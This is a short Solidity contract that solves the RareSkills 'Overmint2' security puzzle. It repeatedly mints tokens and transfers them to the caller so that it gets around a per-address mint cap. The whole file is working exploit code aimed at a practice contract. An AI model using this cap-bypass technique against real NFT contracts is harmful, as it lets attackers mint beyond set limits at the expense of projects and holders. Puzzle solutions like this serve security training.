// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

//@author Tommaso Galantini
// Contract to attack the Overmint2 Rareskills riddle 

interface IOvermint2 {
    function mint() external;
    function success() external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

contract Attacker2 {
    IOvermint2 private overmint;
    address public overmintAddress;

    constructor(address _overmint) {
        overmint = IOvermint2(_overmint);
        overmintAddress = _overmint;
    }
    
    function attack() external {
        for (uint i = 0 ; i < 3; i++){
            overmint.mint();
        }
        uint256 totalSupply = overmint.totalSupply();
        for (uint256 i = totalSupply; i > totalSupply - 3; i--) {
            overmint.transferFrom(address(this), msg.sender, i);
        }
        for (uint256 i = 0; i < 2; i++) {
            overmint.mint();
        }
        for (uint256 i = totalSupply + 2; i > totalSupply; i--) {
            overmint.transferFrom(address(this), msg.sender, i);
        }
    }

}